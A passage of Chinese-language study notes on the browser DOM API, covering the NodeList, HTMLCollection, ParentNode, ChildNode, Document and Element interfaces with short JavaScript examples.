比较节点位置</p><ul><li><p>比较当前节点与任意文档中的另一个节点的位置关系。</p></li><li><p>返回一个六个比特位的二进制值</p><table><thead><tr><th>二进制值</th><th>十进制值</th><th>含义</th></tr></thead><tbody><tr><td>000000</td><td>0</td><td>两个节点相同</td></tr><tr><td>000001</td><td>1</td><td>两个节点不在同一个文档（即有一个节点不在当前文档）</td></tr><tr><td>000010</td><td>2</td><td>参数节点在当前节点的前面</td></tr><tr><td>000100</td><td>4</td><td>参数节点在当前节点的后面</td></tr><tr><td>001000</td><td>8</td><td>参数节点包含当前节点</td></tr><tr><td>010000</td><td>16</td><td>当前节点包含参数节点</td></tr><tr><td>100000</td><td>32</td><td>浏览器内部使用</td></tr></tbody></table></li></ul></li><li><p>Node.prototype.<strong>isEqualNode()</strong> —— <strong>节点是否相等</strong></p><ul><li>两个节点的类型相同、属性相同、子节点相同。</li></ul></li><li><p>Node.prototype.<strong>isSameNode()</strong> —— <strong>两个节点是否为同一节点</strong></p></li><li><p>Node.prototype.<strong>normalize()</strong> —— 节点<strong>规范化</strong></p><ul><li>规范化后的DOM树中，不存在空的文本节点（不包括空格，换行等），或者两个相邻的文本节点。</li></ul></li><li><p>Node.prototype.<strong>getRootNode()</strong> —— 返回根节点</p></li></ul><h2 id="NodeList-接口"><a href="#NodeList-接口" class="headerlink" title="NodeList 接口"></a>NodeList 接口</h2><blockquote><p>节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。DOM 提供两种节点集合，用于容纳多个节点：<code>NodeList</code>和<code>HTMLCollection</code>。</p><p>这两种集合都属于接口规范。许多 DOM 属性和方法，返回的结果是<code>NodeList</code>实例或<code>HTMLCollection</code>实例。</p><p>主要区别是，<code>NodeList</code>可以包含各种类型的节点，<code>HTMLCollection</code>只能包含 HTML 元素节点。</p></blockquote><p>NodeList实例是一个<strong>类似数组</strong>的对象，它的成员是节点对象。</p><ul><li>NodeList可以像数组一样使用length属性和forEach方法。但又不能像数组一样使用pop或push之类的方法。</li><li>可以是动态集合，也可以是静态集合</li></ul><p>通过以下方法可以得到NodeList实例。</p><ul><li><code>Node.childNodes</code></li><li><code>document.querySelectorAll()</code>等节点搜索方法</li></ul><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><ul><li><p>NodeList.prototype.<strong>length</strong> —— Nodelist实例包含的<strong>节点数量</strong></p><ul><li>&#96;&#96;&#96;js<br>document.querySelectorAll(‘xxx’).length<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>### 方法<br><br>- <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NodeList</span>.</span></span>prototype.**<span class="hljs-keyword">for</span><span class="hljs-constructor">Each()</span>** —— **遍历**所有成员<br><br>  - ```js<br>    var children = document.body.childNodes;<br>    children.<span class="hljs-keyword">for</span><span class="hljs-constructor">Each(<span class="hljs-params">function</span> <span class="hljs-params">f</span>(<span class="hljs-params">item</span>, <span class="hljs-params">i</span>, <span class="hljs-params">list</span>)</span> &#123;<br>      <span class="hljs-comment">// ...</span><br>    &#125;, this);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>NodeList.prototype.<strong>item()</strong> —— 返回位置上的成员</p><ul><li>参数为位置，例如item(0)</li></ul></li><li><p>NodeList.prototype.<strong>keys()</strong> —— 返回<strong>键名</strong>的遍历器</p></li><li><p>NodeList.prototype.<strong>values()</strong> ——返回<strong>键值</strong>的遍历器</p></li><li><p>NodeList.prototype.<strong>entries()</strong> —— 返回<strong>键名和键值</strong>的遍历器对象。</p><p>三种的区别，举例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> children = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">childNodes</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">of</span> children.<span class="hljs-title function_">keys</span>()) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);<br>&#125;<br><span class="hljs-comment">// 0</span><br><span class="hljs-comment">// 1</span><br><span class="hljs-comment">// 2</span><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> value <span class="hljs-keyword">of</span> children.<span class="hljs-title function_">values</span>()) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);<br>&#125;<br><span class="hljs-comment">// #text</span><br><span class="hljs-comment">// &lt;script&gt;</span><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> entry <span class="hljs-keyword">of</span> children.<span class="hljs-title function_">entries</span>()) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(entry);<br>&#125;<br><span class="hljs-comment">// Array [ 0, #text ]</span><br><span class="hljs-comment">// Array [ 1, &lt;script&gt; ]</span><br><span class="hljs-comment">// ...</span><br><br></code></pre></td></tr></table></figure></li></ul><h2 id="HTMLCollection-接口"><a href="#HTMLCollection-接口" class="headerlink" title="HTMLCollection 接口"></a>HTMLCollection 接口</h2><p><code>HTMLCollection</code>是一个节点对象的集合，<strong>只能包含元素节点（element）</strong>，不能包含其他类型的节点。</p><p>它没有forEach方法，只能使用for循环遍历。</p><p>返回<code>HTMLCollection</code>实例的，主要是一些<code>Document</code>对象的集合属性。</p><ul><li>比如<code>document.links</code>、<code>document.forms</code>、<code>document.images</code>等。</li></ul><p>实例都是<strong>动态对象</strong>。</p><p>如果元素节点有<code>id</code>或<code>name</code>属性，那么<code>HTMLCollection</code>实例上面，可以使用<code>id</code>属性或<code>name</code>属性引用该节点元素。如果没有对应的节点，则返回<code>null</code>。</p><h3 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h3><ul><li>HTMLCollection.prototype.length ——包含的成员数量</li></ul><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ul><li><p>HTMLCollection.prototype.item() —— 返回参数位置上的成员</p></li><li><p>HTMLCollection.prototype.<strong>namedItem()</strong> —— 返回<strong>当前集合中对应的元素节点</strong></p><ul><li>如果没有，返回null</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// HTML 代码如下</span><br><span class="hljs-comment">// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;</span><br><br><span class="hljs-keyword">var</span> pic = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;pic&#x27;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">images</span>.<span class="hljs-title function_">namedItem</span>(<span class="hljs-string">&#x27;pic&#x27;</span>) === pic <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><code>Collection.namedItem(&#39;value&#39;)</code>等同于<code>Collection[&#39;value&#39;]</code>。</p></li></ul><h2 id="ParentNode-接口"><a href="#ParentNode-接口" class="headerlink" title="ParentNode 接口"></a>ParentNode 接口</h2><p>如果当前节点是父节点，就会混入了（mixin）<code>ParentNode</code>接口。</p><p>由于只有<strong>元素节点（element）</strong>、<strong>文档节点（document）</strong>和<strong>文档片段节点（documentFragment）</strong>拥有子节点，因此只有这三类节点会拥有<code>ParentNode</code>接口。</p><h3 id="属性-3"><a href="#属性-3" class="headerlink" title="属性"></a>属性</h3><ul><li>ParentNode.<strong>children</strong><ul><li>返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有元素子节点。</li><li>只读</li></ul></li><li>ParentNode.<strong>firstElementChild</strong> ——当前节点的<strong>第一个元素子节点</strong></li><li>ParentNode.<strong>lastElementChild</strong> —— 当前节点的<strong>最后一个元素子节点</strong></li><li>ParentNode.<strong>childElementCount</strong> —— 当前节点<strong>所有元素子节点的个数</strong><ul><li>返回一个整数</li></ul></li></ul><h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ul><li><p>ParentNode.<strong>append()</strong> —— 当前节点<strong>追加</strong>一个或多个子节点</p><ul><li>位置是<strong>最后一个元素子节点后</strong></li><li>可添加元素子节点，也可添加文本子节点</li><li>无返回值</li></ul><p>与<code>Node.prototype.appendChild()</code>方法的<strong>三点不同</strong>：</p><ul><li>append() 允许字符串作为参数。appendchild() 只允许子节点作为参数。</li><li>append() 无返回值。appendchild() 返回添加的子节点。</li><li>append() 可添加多个子节点、字符串。 appendchild() 只能添加一个节点。</li></ul></li><li><p>ParentNode.<strong>preappend()</strong> —— 当前节点<strong>追加</strong>一个或多个子节点</p><ul><li>位置是<strong>第一个元素子节点前</strong></li><li>其他和append()方法相同</li></ul></li></ul><h2 id="ChildNode-接口"><a href="#ChildNode-接口" class="headerlink" title="ChildNode 接口"></a>ChildNode 接口</h2><p>如果一个节点有父节点，那么该节点就拥有了<code>ChildNode</code>接口。</p><h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ul><li><p>ChildNode.<strong>remove()</strong> —— 从父节点<strong>移除当前节点</strong></p></li><li><p>ChildNode.<strong>before()</strong> —— 在当前<strong>节点前插入</strong>一个或多个<strong>同级节点</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 插入元素节点和文本节点</span><br>el.<span class="hljs-title function_">before</span>(p, <span class="hljs-string">&#x27;Hello&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>ChildNode.<strong>after()</strong> —— 在当前<strong>节点后插入</strong>一个或多个<strong>同级节点</strong></p></li><li><p>ChildNode.<strong>replaceWith()</strong> —— 参数节点<strong>替换</strong>当前节点</p></li></ul><h2 id="Document-节点"><a href="#Document-节点" class="headerlink" title="Document 节点"></a>Document 节点</h2><p><code>document</code>节点对象代表整个文档，每个网页都有自己的<code>document</code>对象。</p><p><code>window.document</code>属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。</p><p><code>document</code>对象继承了<code>EventTarget</code>接口和<code>Node</code>接口，并且混入（mixin）了<code>ParentNode</code>接口。</p><p>获取document对象的方法：</p><ul><li>普通网页：<code>document</code>、<code>window.document</code></li><li>iframe框架内网页：iframe节点的<code>contentDocument</code>属性。</li><li>Ajax操作返回的文档：使用<code>XMLHttpRequest</code>对象的<code>responseXML</code>属性。</li><li>内部节点的<code>ownerDocument</code>属性。</li></ul><h3 id="属性-4"><a href="#属性-4" class="headerlink" title="属性"></a>属性</h3><h4 id="快捷方式属性"><a href="#快捷方式属性" class="headerlink" title="快捷方式属性"></a>快捷方式属性</h4><p>以下属性是指向文档内部的某个结点的快捷方式。</p><ul><li><p>document.<strong>defaultView</strong> —— document对象所属的<code>window</code>对象</p></li><li><p>document.<strong>doctype</strong> —— <code>&lt;DOCTYPE&gt;</code>节点</p><ul><li><code>document.firstChild</code>通常就返回这个节点。</li></ul></li><li><p>document.<strong>documentElement</strong> —— 返回当前文档的根元素节点</p><ul><li>通常是第二个子节点，也就是<code>&lt;html&gt;</code></li></ul></li><li><p>document.<strong>body</strong> —— 指向 <code>&lt;body&gt;</code></p></li><li><p>document.<strong>head</strong> —— 指向<code>&lt;head&gt;</code></p></li><li><p>document.<strong>scrollingElement</strong> —— 返回文档的<strong>滚动元素</strong></p><ul><li>标准模式下，返回文档的根元素（document.documentElement ），也就是<code>&lt;html&gt;</code></li><li>兼容（quirk）模式下，返回的是<code>&lt;body&gt;</code>元素</li><li>不存在，返回null</li></ul></li><li><p>document.<strong>activeElement</strong> —— 返回当前**焦点(focus)**的DOM元素</p></li><li><p>document.<strong>fullscreenElement</strong> —— 返回当前以全屏状态展示的DOM元素</p><ul><li><p>例如判断用户行为，是否video处在全屏状态</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">fullscreenElement</span>.<span class="hljs-property">nodeName</span> == <span class="hljs-string">&#x27;VIDEO&#x27;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;全屏播放视频&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="节点属性集合"><a href="#节点属性集合" class="headerlink" title="节点属性集合"></a>节点属性集合</h4><p>以下属性返回一个<code>HTMLCollection</code>实例，表示文档内部特定元素的集合。</p><p>这些集合是动态的。</p><ul><li><p>document.<strong>links</strong> —— 返回当前文档所有设定了<code>href</code>属性的<code>&lt;a&gt;</code>及<code>&lt;area&gt;</code>节点。</p></li><li><p>document.<strong>forms</strong> —— 返回所有<code>&lt;form&gt;</code>表单节点。</p><ul><li>可使用位置、id和name属性来引用</li></ul></li><li><p>document.<strong>images</strong> —— 返回页面所有<code>&lt;img&gt;</code>图片节点。</p><ul><li><p>例：在所有img标签中寻找特定图片</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> imglist = <span class="hljs-variable language_">document</span>.<span class="hljs-property">images</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; imglist.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-keyword">if</span> (imglist[i].<span class="hljs-property">src</span> === <span class="hljs-string">&#x27;banner.gif&#x27;</span>) &#123;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>document.<strong>embeds</strong> —— 返回所有<code>&lt;embed&gt;</code>节点。</p></li><li><p>document.<strong>plugins</strong> —— 返回所有<code>&lt;embed&gt;</code>节点。</p></li><li><p>document.<strong>scripts</strong> —— 返回所有<code>&lt;script&gt;</code>节点。</p></li><li><p>document.<strong>styleSheets</strong> ——返回网页内嵌或引入的 CSS 样式表集合</p><ul><li>和以上的其他节点属性集合不同，返回的是<code>StyleSheetList</code>实例。</li></ul></li></ul><h4 id="文档静态信息属性"><a href="#文档静态信息属性" class="headerlink" title="文档静态信息属性"></a>文档静态信息属性</h4><p>以下属性返回文档信息。</p><ul><li><p>document.<strong>documentURI</strong> ——当前文档的网址</p><ul><li><strong>继承自<code>Document</code>接口，可用于所有文档</strong></li></ul></li><li><p>document.<strong>URL</strong> —— 当前文档的网址</p><ul><li><strong>继承自<code>HTMLDocument</code>接口，只能用于 HTML 文档。</strong></li></ul></li><li><p>document.<strong>domain</strong> —— 当前文档的域名（不包括协议和端口）</p><ul><li>例如<code>http://www.example.com:80/hello.html</code>返回<code>www.example.com</code></li><li>大多情况下只读。除了次级域名的网页，可以把该属性设置为上级域名。<ul><li><code>a.sub.example.com</code>可设为<code>sub.example.com</code>或者<code>example.com</code></li><li>设置该属性会导致端口被改为null</li></ul></li></ul></li><li><p>document.<strong>location</strong> —— 包含有文档的 URL 相关的信息，并提供了改变该 URL 和加载其他 URL 的方法。只读。</p></li><li><p>document.<strong>lastModified</strong> —— 返回一个字符串，表示当前文档的最后修改时间。</p></li><li><p>document.<strong>title</strong> —— 标题</p></li><li><p>document.<strong>characterSet</strong> —— 编码格式</p></li><li><p>document.<strong>referrer</strong> —— 来访者来源</p><ul><li>来源指从哪个页面跳转到此页面</li><li>无法获取（例如直接输入网址访问），则返回空字符串</li></ul></li><li><p>document.<strong>dir</strong> —— 文字方向</p><ul><li>rtl：从右到左</li><li>ltr：从左到右</li></ul></li><li><p>document.compatMode —— 浏览器处理文档的模式</p><ul><li><code>BackCompat</code>（向后兼容模式）</li><li><code>CSS1Compat</code>（严格模式）</li></ul></li></ul><h4 id="文档状态属性"><a href="#文档状态属性" class="headerlink" title="文档状态属性"></a>文档状态属性</h4><ul><li><p>document.<strong>hidden</strong> —— 当前页面是否可见，布尔值</p><ul><li>这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。</li></ul></li><li><p>document.<strong>visibilityState</strong>—— 返回文档的可见状态</p><ul><li><code>visible</code>：页面<strong>可见</strong>。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。</li></ul></li><li><p><code>hidden</code>：页面<strong>不可见</strong>，有可能窗口最小化，或者浏览器切换到了另一个 Tab。</p><ul><li><code>prerender</code>：页面处于<strong>正在渲染状态</strong>，对于用户来说，该页面不可见。</li></ul></li><li><p><code>unloaded</code>：页面<strong>从内存里面卸载了</strong>。</p></li><li><p>document.<strong>readyState</strong> —— 文档的当前状态</p><ul><li><code>loading</code>：加载 HTML 代码阶段（尚未完成解析）</li><li><code>interactive</code>：加载外部资源阶段（HTML文档解析完成）</li><li><code>complete</code>：加载完成</li></ul></li></ul><h4 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h4><p>获取并设置与当前文档相关联的 cookie。</p><p>可以把它当成一个 <code>getter and setter</code>。</p><h4 id="document-designMode"><a href="#document-designMode" class="headerlink" title="document.designMode"></a>document.designMode</h4><p>控制当前文档是否可编辑。</p><p>该属性只有on和off（默认）两个值。</p><p>一旦设为<code>on</code>，用户就可以编辑整个文档的内容。</p><h4 id="document-currentScript"><a href="#document-currentScript" class="headerlink" title="document.currentScript"></a>document.currentScript</h4><p>该属性只能用在<code>&lt;script&gt;</code>元素的内嵌脚本或加载的外部脚本之中。</p><p>返回当前脚本所在的那个 DOM 节点，即<code>&lt;script&gt;</code>元素的 DOM 节点。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;foo&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">currentScript</span> === <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;foo&#x27;</span>)</span><br><span class="language-javascript">  ); <span class="hljs-comment">// true</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="document-implementation"><a href="#document-implementation" class="headerlink" title="document.implementation"></a>document.implementation</h4><p>返回一个<code>DOMImplementation</code>对象。</p><ul><li><strong><code>DOMImplementation</code></strong> 接口代表了一个对象，这个对象提供了不依赖于任何 document 的方法。</li></ul><p>该对象有三个方法(主用于创建独立于当前文档的新的 Document 对象)。</p><ul><li><code>DOMImplementation.createDocument()</code>：创建一个 XML 文档。</li><li><code>DOMImplementation.createHTMLDocument()</code>：创建一个 HTML 文档。</li><li><code>DOMImplementation.createDocumentType()</code>：创建一个 DocumentType 对象。</li></ul><h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ul><li><p>document.<strong>open()</strong> —— <strong>清除</strong>当前文档的所有内容，使文档处于<strong>可写</strong>状态</p></li><li><p>document.<strong>close()</strong>  —— 关闭document.open() 打开的文档</p></li><li><p>document.<strong>write()</strong> —— 向当前文件写入内容</p></li><li><p>document.<strong>writeln()</strong> —— 和write()类似，但会在内容末尾添加换行符</p><ul><li>添加的是ASCII码换行符，渲染成html网页不起作用。要显示的写入<code>&lt;br&gt;</code>才能实现网页上的换行。</li></ul></li><li><p>document.<strong>querySelector()</strong> —— 接受一个<strong>css选择器</strong>作为参数，返回匹配该选择器的元素节点。</p><ul><li>若有多个节点满足，返回第一个匹配的节点</li></ul></li><li><p>document.<strong>querySelectorAll()</strong>  —— 和querySelector()类似，但返回一个NodeList对象，包含所有匹配给定选择器的节点。</p><ul><li>两个方法都不支持 CSS 伪元素的选择器（比如<code>:first-line</code>和<code>:first-letter</code>）和伪类的选择器（比如<code>:link</code>和<code>:visited</code>）。即无法选中伪元素和伪类。</li></ul></li><li><p>document.<strong>getElementsByTagName()</strong> —— 返回一个包括所有<strong>给定标签</strong>名称的元素的类数组对象（<code>HTMLCollection</code>实例）</p><ul><li>动态反应HTML文档变化，自动更新，不用再次调用</li><li>因为HTML标签名大小写不敏感，所以该方法也对大小写不敏感</li><li>传入<code>*</code>，返回所有HTML元素</li></ul></li><li><p>document.<strong>getElementsByClassName()</strong> ——返回一个包含了<strong>所有指定类</strong>名的子元素的类数组对象。（<code>HTMLCollection</code>实例）</p><ul><li>可有多个class，用空格分隔。</li><li>与<code>getElementsByTagName()</code>方法一样，<code>getElementsByClassName()</code>方法不仅可以在<code>document</code>对象上调用，也<strong>可以在任何元素节点上调用</strong>。</li></ul></li><li><p>document.<strong>getElementsByName()</strong> ——根据给定的<strong>name属性</strong>返回一个在 (X)HTML document 的节点列表集合。</p></li><li><p>document.<strong>getElementById()</strong> —— 返回匹配指定<strong>id属性</strong>的元素节点。</p><ul><li>参数大小写敏感</li><li>该方法只能在<code>document</code>对象上使用，不能在其他元素节点上使用。</li></ul></li><li><p>document.elementFromPoint() —— 返回位于页面<strong>指定位置最上层</strong>的元素节点。</p></li><li><p>document.elementsFromPoint() —— 返回一个数组，成员时位于指定坐标的所有元素。</p></li><li><p>document.<strong>createElement()</strong> —— <strong>生成</strong>元素节点，并返回该节点</p><ul><li>参数为标签名</li></ul></li><li><p>document.<strong>createTextNode()</strong> ——生成<strong>文本节点</strong>（Text实例）</p><ul><li>这个方法确可以确保返回的节点被浏览器当做文本渲染，而不是HTML代码渲染。从而避免XSS攻击。</li></ul></li><li><p>document.<strong>createAttribute()</strong> —— 生成一个<strong>属性节点</strong>（Attr实例）</p><ul><li>参数为属性名</li></ul></li><li><p>document.<strong>createComment()</strong> —— 生成一个<strong>注释节点</strong></p></li><li><p>document.<strong>createDocumentFragment()</strong> —— 生成一个空的文档片段对象（<code>DocumentFragment</code>实例）。</p><ul><li><code>DocumentFragment</code>常用来生成一段较复杂的DOM结构，再插入当前文档</li></ul></li><li><p>document.createEvent() —— 生成一个<strong>事件对象</strong>（<code>Event</code>实例）</p><ul><li><code>document.createEvent</code>方法的参数是事件类型，比如<code>UIEvents</code>、<code>MouseEvents</code>、<code>MutationEvents</code>、<code>HTMLEvents</code>。</li></ul></li><li><p>document.<strong>addEventListener()</strong> </p><ul><li><strong>将指定的监听器注册到 EventTarget 上</strong>，当该对象触发指定的事件时，指定的回调函数就会被执行。</li></ul></li><li><p>document.<strong>removeEventListener()</strong></p><ul><li>可以删除使用 EventTarget.addEventListener() 方法添加的事件。</li></ul></li><li><p>document.<strong>hasFocus()</strong> —— 返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。</p></li><li><p>document.<strong>adoptNode()</strong> —— 从其他的 document 文档中获取一个节点</p><ul><li>该节点以及它的子树上的所有节点都会<strong>从原文档删除</strong> (如果有这个节点的话), 并且它的ownerDocument 属性会变成当前的 document 文档。</li></ul></li><li><p>document.<strong>importNode()</strong> ——将外部文档的一个节点拷贝一份，插入当前文档。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">importNode(externalNode, deep)<br></code></pre></td></tr></table></figure><ul><li>externalNode：导入当前文档的外部Node或DocumentFragment</li><li>deep（可选）：布尔值。默认false。表明是否要导入 <code>externalNode</code> 的整个 DOM 子树。<ul><li><code>true</code>：拷贝 <code>externalNode</code> 和它的所有后代。</li><li><code>false</code>：仅拷贝 <code>externalNode</code>——新的节点没有后代。</li></ul></li></ul></li><li><p>document.<strong>createNodeIterator()</strong> ——返回一个新的子节点遍历器。</p><p>例：返回<code>&lt;body&gt;</code>元素子节点的遍历器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> nodeIterator = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createNodeIterator</span>(<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>,<br>  <span class="hljs-title class_">NodeFilter</span>.<span class="hljs-property">SHOW_ELEMENT</span><br>);<br></code></pre></td></tr></table></figure><ul><li>第一个参数为所要遍历的<strong>根节点</strong></li><li>第二个参数为所要遍历的<strong>节点类型</strong><ul><li>所有节点：NodeFilter.SHOW_ALL</li><li>元素节点：NodeFilter.SHOW_ELEMENT</li><li>文本节点：NodeFilter.SHOW_TEXT</li><li>评论节点：NodeFilter.SHOW_COMMENT</li></ul></li></ul></li><li><p>document.document.createTreeWalker() —— 返回一个DOM的子树遍历器。</p></li><li><p>document.execCommand() ——改变内容的样式</p><ul><li><strong>已弃用</strong></li></ul></li><li><p>document.queryCommandSupported() </p><p>返回一个布尔值，表示浏览器是否支持<code>document.execCommand()</code>的某个命令。</p><p><strong>已弃用</strong></p></li><li><p>document.queryCommandEnabled() </p><p>返回一个布尔值，表示当前是否可用<code>document.execCommand()</code>的某个命令。</p><p><strong>已弃用</strong>。</p></li></ul><h2 id="Element节点"><a href="#Element节点" class="headerlink" title="Element节点"></a>Element节点</h2><p><code>Element</code>节点对象对应网页的 HTML 元素。继承Node接口。</p><p>元素节点的nodeType为1。</p><h3 id="属性-5"><a href="#属性-5" class="headerlink" title="属性"></a>属性</h3><h4 id="元素特性的相关属性"><a href="#元素特性的相关属性" class="headerlink" title="元素特性的相关属性"></a>元素特性的相关属性</h4><ul><li>Element.<strong>id</strong> —— 返回指定元素的<code>id</code>属性。可读写。</li><li>Element.<strong>tagName</strong> —— 返回指定元素的<strong>大写标签名</strong>。和nodeName属性的值相等。</li><li>Element.<strong>dir</strong> —— 当前元素的<strong>文字方向</strong><ul><li>ltr：左到右</li><li>rtl：右到左</li></ul></li><li>Element.<strong>accessKey</strong> —— 用于读写分配给当前元素的<strong>快捷键</strong>（accessKey属性）</li><li>Element.<strong>draggable</strong> —— 元素是否可拖动。布尔值。可读写。</li><li>Element.<strong>lang</strong> —— 当前元素语言设置</li><li>Element.<strong>tabIndex</strong> —— 返回一个整数，表示当前元素在Tab键遍历时的顺序。可读写。<ul><li>若值为-1，则不会遍历到该元素。</li></ul></li><li>Element.<strong>title</strong> —— 读写当前元素的 HTML 属性<code>title</code><ul><li>通常指，鼠标悬浮时弹出的文字提示框</li></ul></li></ul><h4 id="元素状态的相关属性"><a href="#元素状态的相关属性" class="headerlink" title="元素状态的相关属性"></a>元素状态的相关属性</h4><ul><li><p>Element.<strong>hidden</strong> —— 表示当前 HTML 元素的<code>hidden</code>属性（是否可见）的值。布尔值。</p><ul><li>实际上并不能判断是否可见，因为该属性和css设置相互独立，且css的优先级更高。</li></ul></li><li><p>Element.contentEditable —— 设置<code>contentEditable</code>属性</p><ul><li><p>全局属性 <strong>contenteditable</strong> 是一个枚举属性，表示元素是否可被用户编辑。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">//EXAMPLE<br><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">contenteditable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>-- Write your own name here<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>Element.isContentEditable —— 返回一个布尔值，表示是否设置了<code>contenteditable</code>属性。该属性只读。</p></li></ul><h4 id="Element-attributes"><a href="#Element-attributes" class="headerlink" title="Element.attributes"></a>Element.attributes</h4><p>返回一个类数组对象。成员是当前元素节点的所有属性节点。</p><h4 id="Element-className，Element-classList"><a href="#Element-className，Element-classList" class="headerlink" title="Element.className，Element.classList"></a>Element.className，Element.classList</h4><p><strong>className</strong> 属性 用来读写当前节点的<code>class</code>属性。值为字符串。不同class间用空格分割。</p><p><strong>classList</strong> 属性 返回一个类数组对象。成员是当前元素节点的每个<code>class</code>。</p><p>classList对象的一些方法：</p><ul><li><code>add()</code>：增加一个 class。</li><li><code>remove()</code>：移除一个 class。</li><li><code>contains()</code>：检查当前元素是否包含某个 class。</li><li><code>toggle()</code>：将某个 class 移入或移出当前元素。<ul><li>从列表中删除一个给定的标记并返回 <code>false</code>。如果标记不存在，则添加并且函数返回 